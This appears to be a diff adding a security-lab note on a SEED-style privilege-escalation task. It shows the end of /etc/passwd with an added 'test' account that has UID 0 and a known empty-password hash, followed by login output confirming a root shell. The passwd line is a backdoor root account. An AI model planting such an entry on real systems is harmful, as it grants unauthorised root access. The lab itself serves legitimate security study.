@@ -1,0 +1,14 @@
+Task 1: append the magic value and test login
+
+End of /etc/passwd:
+seed:x:1000:1000:SEED,,,:/home/seed:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+telnetd:x:126:134::/nonexistent:/usr/sbin/nologin
+ftp:x:127:135:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
+test:U6aMy0wojraho:0:0:test:/root:/bin/bash
+
+Login test with an empty password:
+Password: root
+uid=0(root) gid=0(root) groups=0(root)
+EUID=0
